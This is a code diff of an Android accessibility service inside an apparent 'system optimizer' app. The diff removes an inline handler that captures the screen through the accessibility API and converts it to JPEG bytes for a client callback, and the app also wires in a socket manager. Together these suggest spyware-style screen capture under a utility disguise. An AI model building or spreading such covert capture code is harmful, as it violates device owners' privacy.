@@ -1,17 +1,9 @@
 package com.system.optimizer.service;
 
 import com.system.optimizer.event.AccessibilityEventHandler;
-import com.system.optimizer.service.ScreenshotCallback;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.AppConfig;
 import com.system.optimizer.network.SocketManager;
-import java.util.function.BiConsumer;
-
-import java.io.ByteArrayOutputStream;
-
-import android.graphics.Bitmap;
-import android.graphics.ColorSpace;
-import android.hardware.HardwareBuffer;
 
 import android.os.Build;
 
@@ -29,7 +21,7 @@ public class AccessibilityMonitorService extends AccessibilityService {
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "AccessibilityMonitorService onCreate - initializing components");
+        Log.d(TAG, "Initializing AccessibilityMonitorService");
 
         try {
             this.appConfig = new AppConfig(this);
@@ -109,65 +101,13 @@ public class AccessibilityMonitorService extends AccessibilityService {
         }
     }
 
-    private void takeScreenshotViaAccessibility(ScreenshotCallback clientCallback, int quality) {
+    private void takeScreenshotViaAccessibility(ScreenshotCallback clientCallback) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             clientCallback.onError("API < 30 not supported");
             return;
         }
         takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
-                getMainExecutor(), new ScreenshotResultHandler(clientCallback, quality));
-    }
-
-    /**
-     * Callback handler for Screenshot result.
-     */
-    private class ScreenshotResultHandler implements AccessibilityService.TakeScreenshotCallback {
-        private final ScreenshotCallback clientCallback;
-        private final int quality;
-
-        ScreenshotResultHandler(ScreenshotCallback callback, int quality) {
-            this.clientCallback = callback;
-            this.quality = quality;
-        }
-
-        @Override
-        public void onSuccess(AccessibilityService.ScreenshotResult result) {
-            HardwareBuffer buffer = result.getHardwareBuffer();
-            ColorSpace colorSpace = result.getColorSpace();
-
-            if (buffer != null) {
-                if (colorSpace == null) {
-                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
-                }
-
-                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
-
-                if (bitmap != null) {
-                    byte[] jpegBytes = bitmapToJpegBytes(bitmap, quality);
-                    clientCallback.onSuccess(jpegBytes);
-
-                    bitmap.recycle();
-                }
-
-                buffer.close();
-            }
-        }
-
-        @Override
-        public void onFailure(int error) {
-            String errorMessage = "Screenshot failed with error: " + error;
-            Log.w(TAG, errorMessage);
-            clientCallback.onError(errorMessage);
-        }
-
-        /**
-         * Convert Bitmap to JPEG byte array.
-         */
-        private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
-            return baos.toByteArray();
-        }
+                getMainExecutor(), new ScreenshotResultHandler(clientCallback, appConfig));
     }
 
 }
